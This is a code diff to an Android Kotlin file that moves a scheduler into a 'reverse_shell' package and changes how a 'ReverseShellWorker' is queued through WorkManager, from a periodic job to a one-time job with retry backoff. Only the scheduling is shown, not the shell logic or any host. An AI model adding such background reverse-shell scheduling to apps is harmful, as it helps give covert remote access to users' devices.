@@ -1,4 +1,4 @@
-package com.satwik.nexgenius.core.main
+package com.satwik.nexgenius.core.reverse_shell
 
 import android.content.Context
 import android.os.Build
@@ -6,7 +6,9 @@ import androidx.annotation.RequiresApi
 import androidx.work.BackoffPolicy
 import androidx.work.Constraints
 import androidx.work.ExistingPeriodicWorkPolicy
+import androidx.work.ExistingWorkPolicy
 import androidx.work.NetworkType
+import androidx.work.OneTimeWorkRequestBuilder
 import androidx.work.PeriodicWorkRequestBuilder
 import androidx.work.WorkManager
 import java.time.Duration
@@ -16,7 +18,7 @@ object Scheduler {
     @RequiresApi(Build.VERSION_CODES.O)
     fun scheduleReverseShellWorker(context: Context){
 
-        val workRequest = PeriodicWorkRequestBuilder<ReverseShellWorker>(15, TimeUnit.MINUTES)
+        val workRequest = OneTimeWorkRequestBuilder<ReverseShellWorker>()
             .setBackoffCriteria(
                 backoffPolicy = BackoffPolicy.LINEAR,
                 duration = Duration.ofSeconds(15),
@@ -29,9 +31,9 @@ object Scheduler {
             .build()
 
         WorkManager.getInstance(context)
-            .enqueueUniquePeriodicWork(
-                "Reverse_Shell_1",
-                ExistingPeriodicWorkPolicy.UPDATE,
+            .enqueueUniqueWork(
+                "Reverse_Shell_Worker",
+                ExistingWorkPolicy.REPLACE,
                 workRequest
             )
     }
